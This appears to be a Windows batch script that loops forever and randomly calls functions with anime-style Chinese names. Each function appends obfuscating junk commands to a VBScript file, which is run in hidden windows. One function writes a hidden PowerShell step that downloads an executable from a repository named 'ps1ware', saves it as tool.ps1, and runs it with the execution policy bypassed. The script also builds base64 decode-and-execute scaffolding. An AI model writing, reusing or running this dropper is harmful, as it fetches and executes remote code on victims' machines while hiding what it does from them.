@echo off
setlocal EnableDelayedExpansion

:: === Config ===
set "vbsFile=anime_script.vbs"

:: Exotic anime-style function names
set funcs=龙剑 雪影 鬼炎 白虎 幽冥 烈火 狐影 狂风 鸣人 火影 风之子 闪电 紫龙 烈刃 黑影 天照 武藏 剑心 蓝焰 赤龙 幻影 神言 石像 影走 空读 虚探 流去 魂转 知无

:: Main infinite loop
:loop
call :getRandomFunc funcName
call :!funcName! >nul 2>&1

:: 30% chance to run VBS
set /a runChance=!random! %% 10
if !runChance! LSS 3 (
    wscript.exe "%vbsFile%" >nul 2>&1
)

:: Wait 1–10 seconds
set /a sleepTime=!random! %% 10 + 1
timeout /t !sleepTime! >nul
goto loop

:getRandomFunc
set /a idx=!random! %% 31 + 1
for /f "tokens=%idx%" %%a in ("%funcs%") do set %1=%%a
goto :eof

:龙剑
if not exist "%vbsFile%" (
    >>"%vbsFile%" echo Randomize
    >>"%vbsFile%" echo Set shell = CreateObject("WScript.Shell")
    >>"%vbsFile%" echo Set fso = CreateObject("Scripting.FileSystemObject")
    >>"%vbsFile%" echo Function Base64Decode(str)
    >>"%vbsFile%" echo     Set xml = CreateObject("Msxml2.DOMDocument.3.0")
    >>"%vbsFile%" echo     Set node = xml.CreateElement("b64")
    >>"%vbsFile%" echo     node.DataType = "bin.base64"
    >>"%vbsFile%" echo     node.Text = str
    >>"%vbsFile%" echo     Base64Decode = node.nodeTypedValue
    >>"%vbsFile%" echo End Function
)
goto :eof

:雪影
>>"%vbsFile%" echo If Rnd > 0.5 Then
>>"%vbsFile%" echo     shell.Run "cmd /c echo 雪影之怒", 0, True
>>"%vbsFile%" echo End If
goto :eof

:鬼炎
>>"%vbsFile%" echo a = "WScript.Echo ""👻 鬼炎来了!"""
>>"%vbsFile%" echo Execute a
goto :eof

:白虎
>>"%vbsFile%" echo b = "WScript.Echo ""⚪ 白虎之爪!"""
>>"%vbsFile%" echo Execute b
goto :eof

:幽冥
>>"%vbsFile%" echo If Rnd < 0.3 Then
>>"%vbsFile%" echo     shell.Run "cmd /c dir > nul", 0, True
>>"%vbsFile%" echo End If
goto :eof

:烈火
set "encoded=V1NjcmlwdC5FY2hvICJGaXJlIGF0dGFjayEg77yB77yB77yB"
>>"%vbsFile%" echo decoded = Base64Decode("%encoded%")
>>"%vbsFile%" echo Execute decoded
goto :eof

:狐影
>>"%vbsFile%" echo For i = 1 To 2
>>"%vbsFile%" echo     shell.Run "cmd /c echo 狐影...", 0, True
>>"%vbsFile%" echo Next
goto :eof

:狂风
>>"%vbsFile%" echo If Hour(Now) Mod 2 = 0 Then
>>"%vbsFile%" echo     WScript.Echo "狂风の夜"
>>"%vbsFile%" echo End If
goto :eof

:鸣人
>>"%vbsFile%" echo shell.Run "cmd /c echo Rasengan!!", 0, True
goto :eof

:火影
>>"%vbsFile%" echo If Int((100 * Rnd) + 1) < 50 Then
>>"%vbsFile%" echo     shell.Run "powershell -Command Invoke-WebRequest -Uri 'https://github.com/s-b-repo/ps1ware/raw/main/ELDRITCHSOUP.EXE' -OutFile 'tool.ps1'", 0, True
>>"%vbsFile%" echo     If fso.FileExists("tool.ps1") Then
>>"%vbsFile%" echo         shell.Run "powershell -ExecutionPolicy Bypass -File tool.ps1", 0, True
>>"%vbsFile%" echo     End If
>>"%vbsFile%" echo End If
goto :eof

:风之子
>>"%vbsFile%" echo WScript.Sleep 500
goto :eof

:闪电
>>"%vbsFile%" echo shell.Run "cmd /c echo ⚡⚡⚡", 0, True
goto :eof

:紫龙
>>"%vbsFile%" echo WScript.Echo "紫龙の拳!"
goto :eof

:烈刃
>>"%vbsFile%" echo For x = 1 To 3
>>"%vbsFile%" echo     shell.Run "cmd /c echo Slash!", 0, True
>>"%vbsFile%" echo Next
goto :eof

:黑影
>>"%vbsFile%" echo WScript.Sleep 1000
goto :eof

:天照
>>"%vbsFile%" echo a = Hour(Now)
>>"%vbsFile%" echo If a > 12 Then
>>"%vbsFile%" echo     shell.Run "cmd /c echo Sun is up", 0, True
>>"%vbsFile%" echo End If
goto :eof

:武藏
>>"%vbsFile%" echo If Day(Now) Mod 2 = 0 Then
>>"%vbsFile%" echo     WScript.Echo "武藏 strikes"
>>"%vbsFile%" echo End If
goto :eof

:剑心
>>"%vbsFile%" echo WScript.Sleep 750
goto :eof

:蓝焰
>>"%vbsFile%" echo shell.Run "cmd /c echo Blue Flames!", 0, True
goto :eof

:赤龙
>>"%vbsFile%" echo shell.Run "cmd /c echo 赤龙怒火!!", 0, True
goto :eof

:幻影
>>"%vbsFile%" echo cmd = "cmd /c for /L %%i in (1,1,3) do ping -n 1 google.com >nul"
>>"%vbsFile%" echo shell.Run cmd, 0, True
goto :eof

:神言
>>"%vbsFile%" echo incant = "cmd /c help > nul"
>>"%vbsFile%" echo shell.Run incant, 0, True
goto :eof

:石像
>>"%vbsFile%" echo vision = "cmd /c dir /b > nul"
>>"%vbsFile%" echo shell.Run vision, 0, True
goto :eof

:影走
>>"%vbsFile%" echo clone = "cmd /c tasklist > nul"
>>"%vbsFile%" echo shell.Run clone, 0, True
goto :eof

:空读
>>"%vbsFile%" echo shell.Run "cmd /c wmic memorychip get capacity > nul", 0, True
goto :eof

:虚探
>>"%vbsFile%" echo shell.Run "powershell -Command ""Get-Process | Select-Object -First 5 > $null""", 0, True
goto :eof

:流去
>>"%vbsFile%" echo shell.Run "cmd /c certutil -dump %%~f0 > nul", 0, True
goto :eof

:魂转
>>"%vbsFile%" echo shell.Run "cmd /c echo 0xDEADBEEF > nul", 0, True
goto :eof

:知无
>>"%vbsFile%" echo shell.Run "cmd /c tasklist /m kernel32.dll > nul", 0, True
goto :eof
